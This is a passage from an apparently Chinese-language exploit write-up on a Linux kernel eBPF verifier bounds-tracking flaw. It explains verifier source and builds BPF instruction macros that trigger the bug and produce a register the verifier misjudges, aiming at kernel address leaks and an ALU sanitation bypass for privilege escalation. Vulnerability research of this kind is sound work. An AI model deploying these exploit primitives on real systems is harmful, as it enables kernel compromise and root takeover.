reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* Learn sign from unsigned bounds.  Signed bounds cross the sign</span><br><span class="hljs-comment"> * boundary, so we must be careful.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s64)reg-&gt;umax_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Positive.  We can&#x27;t learn anything from the smin, but smax</span><br><span class="hljs-comment"> * is positive, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value;<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s64)reg-&gt;umin_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Negative.  We can&#x27;t learn anything from the smax, but smin</span><br><span class="hljs-comment"> * is negative, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__reg32_deduce_bounds(reg);<br>__reg64_deduce_bounds(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <code>__reg_bound_offset()</code> 则是基于边界值范围重新计算 <code>var_off</code> 的值：</p><ul><li><code>tnum_range()</code>：取 min 中 min、max 的低位相同位部分，从第一个不同位开始设为未知</li><li><code>tnum_intersect()</code>：取 a、b 的共有已知为 1 的位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_range</span><span class="hljs-params">(u64 min, u64 max)</span><br>&#123;<br>u64 chi = min ^ max, delta;<br>u8 bits = fls64(chi); <span class="hljs-comment">// 找到为 1 的最低位</span><br><br><span class="hljs-comment">/* 特殊情况， 需要这样因为 1ULL &lt;&lt; 64 是未定义的 */</span><br><span class="hljs-keyword">if</span> (bits &gt; <span class="hljs-number">63</span>)<br><span class="hljs-keyword">return</span> tnum_unknown;<br><span class="hljs-comment">/* 例如若 chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.</span><br><span class="hljs-comment"> * 若 chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, </span><br><span class="hljs-comment"> *  故我们返回常数 min (因为 min == max).</span><br><span class="hljs-comment"> */</span><br>delta = (<span class="hljs-number">1ULL</span> &lt;&lt; bits) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> TNUM(min &amp; ~delta, delta);<br>&#125;<br><br><span class="hljs-comment">/* 需要注意的是若 a 与 b 不同意 - 即其一有一个 &#x27;known 1&#x27; 而另一个则</span><br><span class="hljs-comment"> * 有一个 &#x27;known 0&#x27; - 这将为该位返回一个 &#x27;known 1&#x27;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_intersect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tnum a, <span class="hljs-keyword">struct</span> tnum b)</span><br>&#123;<br>u64 v, mu;<br><br>v = a.value | b.value;<br>mu = a.mask &amp; b.mask;<br><span class="hljs-keyword">return</span> TNUM(v &amp; ~mu, mu);<br>&#125;<br><br><span class="hljs-comment">/* 尝试基于无符号最小/最大值改进 var_off 信息 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_bound_offset(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var64_off</span> =</span> tnum_intersect(reg-&gt;var_off,<br>       tnum_range(reg-&gt;umin_value,<br>  reg-&gt;umax_value));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_intersect(tnum_subreg(reg-&gt;var_off),<br>tnum_range(reg-&gt;u32_min_value,<br>   reg-&gt;u32_max_value));<br><br>reg-&gt;var_off = tnum_or(tnum_clear_subreg(var64_off), var32_off);<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个操作在这里都不会影响 R2 的值</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>现在我们来构造能够触发该漏洞的两个寄存器 <code>R2 = &#123; .value = 1, mask = 0xffffffff00000000 &#125;</code> 与 <code>R3 = &#123; .value = 0x100000002, mask = 0 &#125;</code>，其中 <code>R3</code> 可以直接通过赋值构造一个 known 的寄存器， <code>R2</code> 需要一半已知一半未知，可以通过 <em>从 map 中取出一个值进行赋值</em> 的方式先构造出一个 unknown 的寄存器，再与 <code>0xffffffff00000000</code> 做 AND 操作使其低 32 位变为 known：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> POC_PROG(__map_fd)                              \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* Load value from map */</span>                       \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),            \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),   \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x1),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><p>把这个程序载入内核过一遍 verifier，简单打印下日志，可以看到<strong>我们确乎构造出了一个最小边界值为 1、最大边界值为 0 的寄存器</strong>：</p><p><img src="https://s2.loli.net/2023/06/02/br1XJgjKeFR6pOq.png" alt="测试 poc"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><p>接下来我们考虑如何利用这个漏洞完成提权，现在我们有了一个 32 位边界值为 <code>[1，0]</code> 、32位推测值与32位运行时值都为 0 的寄存器，接下来我们考虑如何构造一个<strong>verifier 推测值与运行时值不同的寄存器</strong>，从而继续完成后续利用</p><h2 id="一、构造边界值为-1-0-的寄存器"><a href="#一、构造边界值为-1-0-的寄存器" class="headerlink" title="一、构造边界值为 [1, 0] 的寄存器"></a>一、构造边界值为 [1, 0] 的寄存器</h2><p><strong>第一步还是先利用漏洞构造一个最小边界值为 1、最大边界值为 0 的寄存器</strong>，因为 R1~R5 有的时候要用来作为函数参数，所以这里我们改为在 <code>R6</code> 上继续构造</p><p>因为读取 map 的操作代码行数太长了（），所以笔者现在给他封装到一个 <code>BPF_READ_ARRAY_MAP_IDX()</code> 宏里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* get a pointer to bpf_array */</span>                \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* mov the result back and clear R0 */</span>          \</span><br><span class="hljs-meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><h2 id="二、构造运行时为-1、verifier-确信为-0-的寄存器"><a href="#二、构造运行时为-1、verifier-确信为-0-的寄存器" class="headerlink" title="二、构造运行时为 1、verifier 确信为 0 的寄存器"></a>二、构造运行时为 1、verifier 确信为 0 的寄存器</h2><p>我们还是考虑继续在 32 位上做文章，假如我们构造出另一个 32 位边界值为 <code>[0, 1]</code> 、32位运行时值为 <code>0</code> 寄存器 <code>R7</code>，将这个寄存器与我们的 <code>R6</code> 相加，其边界值计算其实就是检查是否有溢出然后简单的把两个寄存器边界相加：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>s32 smax_val = src_reg-&gt;s32_max_value;<br>u32 umin_val = src_reg-&gt;u32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||<br>    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;<br>dst_reg-&gt;s32_min_value = S32_MIN;<br>dst_reg-&gt;s32_max_value = S32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;s32_min_value += smin_val;<br>dst_reg-&gt;s32_max_value += smax_val;<br>&#125;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||<br>    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;<br>dst_reg-&gt;u32_min_value = <span class="hljs-number">0</span>;<br>dst_reg-&gt;u32_max_value = U32_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>dst_reg-&gt;u32_min_value += umin_val;<br>dst_reg-&gt;u32_max_value += umax_val;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时我们的寄存器 <code>R6</code> 32位边界值为 <code>[1, 1]</code>，之后 verifier 会调用 <code>__reg_bound_offset()</code> 反向赋值给 <code>var_off</code>，此时我们的 <code>var_off</code> 的 32 位值便为 <code>1</code>，但实际上的 32 位值为 0，我们便获得了一个<strong>运行时为 0 、verifier 认为是 1 的寄存器</strong></p><p><img src="https://s2.loli.net/2023/06/03/C3PqmrvoNpFXJVc.png" alt="R6 += R7"></p><p>这样一个寄存器好像对我们来说没有太多作用，但如果我们再给 <code>R6</code> 加上 <code>1</code> ，从而使得 32 位 <code>var_off</code> 变为 <code>2</code>，<strong>但实际上的 32 位值为 1</strong>，我们再将 <code>R6</code> 与 <code>1</code> 做 <code>&amp;</code> 运算，<strong>verifier 便会认为该寄存器的值变为 0，但其实际上的运行时值为 1</strong></p><p><img src="https://s2.loli.net/2023/06/03/shRKgi38zScMfOe.png" alt="R6 += 1"></p><p><img src="https://s2.loli.net/2023/06/03/UBW2qvyrlsVax4I.png" alt="verifier:0, runtime:1"></p><p>有了这样一个寄存器，后面我们就可以开始为所欲为了：）</p><p>对于 <code>R7</code> 的构造，我们可以先从 map 中取值获取一个 verifier 全不可知的寄存器，之后利用 32 位判断跳转指令 <code>BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2)</code> 使其变为 <code>&#123; .var_off = 0, .mask = 0xffffffff00000001&#125;</code> 即可，map 中的值是我们可控的所以我们可以使其运行时值为 0 ：</p><blockquote><p>注：你也可以先给 R6 +&#x3D; 1 再 R6 &amp;&#x3D; R7，效果是一样的</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br></code></pre></td></tr></table></figure><blockquote><p>可能大家会想到对于条件跳转指令而言 verifier 主要根据边界值进行判断，或许我们能够构造一个运行时为真但 verifier 认为假的条件跳转语句（例如 <code>BPF_JMP32_IMM(BPF_JGE, BPF_REG_6, 1, 1)</code>）并在 verifier 认为恒为假但运行时为真的分支中隐藏恶意指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">is_branch32_taken</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u32 val, u8 opcode)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">subreg</span> =</span> tnum_subreg(reg-&gt;var_off);<br>s32 sval = (s32)val;<br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_JGE:<br><span class="hljs-keyword">if</span> (reg-&gt;u32_min_value &gt;= val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (reg-&gt;u32_max_value &lt; val)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>但这并不是一个可行的方案，因为对于不可达指令（dead code），<strong>verifier会将其 patch 为跳转回条件分支指令</strong>，从而导致我们无法在此处藏入恶意代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sanitize_dead_code</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn_aux_data</span> *<span class="hljs-title">aux_data</span> =</span> env-&gt;insn_aux_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">trap</span> =</span> BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> insn_cnt = env-&gt;prog-&gt;len;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++) &#123;<br><span class="hljs-keyword">if</span> (aux_data[i].seen)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-built_in">memcpy</span>(insn + i, &amp;trap, <span class="hljs-keyword">sizeof</span>(trap));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="三、内核地址泄露"><a href="#三、内核地址泄露" class="headerlink" title="三、内核地址泄露"></a>三、内核地址泄露</h2><p>接下来我们考虑如何泄露内核地址，比较容易想到的是我们或许可以通过这个运行时为 1 而 verifier 认为是 0 的寄存器构造一些越界读取，而 map 是我们能够直接接触到的指针之一，因此我们可以尝试从此处下手</p><p>我们是否可以直接向  <code>BPF_FUNC_map_lookup_elem()</code>  传入一个 verifier 确信为 0 但实际上是负数的寄存器呢？<strong>答案是否定的</strong>，因为对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型的 map 而言在查找元素时实际上会调用到 <code>array_map_lookup_elem()</code> ，其 index 为无符号类型，因此我们无法前向读取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall or from eBPF program */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">array_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = *(u32 *)key;<br><br><span class="hljs-keyword">if</span> (unlikely(index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">array</span>-&gt;value + <span class="hljs-built_in">array</span>-&gt;elem_size * (index &amp; <span class="hljs-built_in">array</span>-&gt;index_mask);<br>&#125;<br></code></pre></td></tr></table></figure><p>但当我们在 eBPF 程序中调用 <code>BPF_FUNC_map_lookup_elem()</code>  时，其返回值为指向 <code>value</code> 的指针，而<strong>这个指针是允许与常量做运算的</strong>（类型为 <code>PTR_TO_MAP_VALUE</code> ），由于我们有一个 verifier 认为是 0 的寄存器，我们可以轻松绕过对指针范围的检查并完成越界读取……吗？</p><h3 id="ALU-Sanitation-bypass"><a href="#ALU-Sanitation-bypass" class="headerlink" title="ALU Sanitation bypass"></a>ALU Sanitation bypass</h3><p><code>ALU Sanitation</code> 是一个用于<strong>运行时动态检测</strong>的功能，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足，这项技术通过调用 <code>fixup_bpf_calls()</code> <strong>为 eBPF 程序中的每一条指令的前面都添加上额外的辅助指令</strong>来实现</p><p>对于 <code>BPF_ADD</code> 及 <code>BPF_SUB</code> 这样的指令而言，会添加如下辅助指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fixup_bpf_calls</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (insn-&gt;code == (BPF_ALU64 | BPF_ADD | BPF_X) ||<br>    insn-&gt;code == (BPF_ALU64 | BPF_SUB | BPF_X)) &#123;<br><span class="hljs-type">const</span> u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;<br><span class="hljs-type">const</span> u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insn_buf</span>[16];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">patch</span> =</span> &amp;insn_buf[<span class="hljs-number">0</span>];<br><span class="hljs-type">bool</span> issrc, isneg;<br>u32 off_reg;<br><br>aux = &amp;env-&gt;insn_aux_data[i + delta];<br><span class="hljs-keyword">if</span> (!aux-&gt;alu_state ||<br>    aux-&gt;alu_state == BPF_ALU_NON_POINTER)<br><span class="hljs-keyword">continue</span>;<br><br>isneg = aux-&gt;alu_state &amp; BPF_ALU_NEG_VALUE;<br>issrc = (aux-&gt;alu_state &amp; BPF_ALU_SANITIZE) ==<br>BPF_ALU_SANITIZE_SRC;<br><br>off_reg = issrc ? insn-&gt;src_reg : insn-&gt;dst_reg;<br><span class="hljs-keyword">if</span> (isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="hljs-number">1</span>);<br>*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="hljs-number">0</span>);<br>*patch++ = 